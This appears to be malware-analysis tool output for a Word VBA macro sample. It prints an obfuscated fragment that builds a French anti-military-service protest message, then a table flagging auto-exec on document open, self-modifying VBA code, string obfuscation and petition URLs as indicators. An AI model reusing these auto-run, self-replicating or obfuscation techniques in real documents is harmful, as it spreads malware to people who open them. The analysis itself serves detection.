"jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32): c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) _
+ "salariés," + Chr(32) + "rêveurs," + Chr(32) ' bixrwydxt
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs": b2 = Chr(32) + "ou" + _
Chr(32) + "tout" + Chr(32) + "simplement" + _
Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) + "Vie" + Chr(32) ' ejqwxol
b2 = b2 + "pour" + Chr(32) + "ces" _
+ Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + "Ils" + Chr(32) + _
"refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" + Chr(32) _
+ "service" + Chr(32) + "inégalitaire" + Chr(32): b2 = b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" + Chr(32) + "pour" _
+ Chr(32) + "les" + Chr(32) _
+ "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' gewbrp
b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" _
+ Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N.": a1 = _
a1 + Chr(32) + "qui" + Chr(32) + "tue" + _
Chr(32) + "l" _
+ Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn": e4 = Chr(80) + _
Chr(114) + Chr(105) _
+ Chr(118) + Chr(97) + Chr(116) + Chr(101): j17 = Chr(69) + Chr(110) + Chr(100) ' frjdrfjspuj
c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98): End Sub ' mgmatcehekr

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
+----------+--------------------+---------------------------------------------+

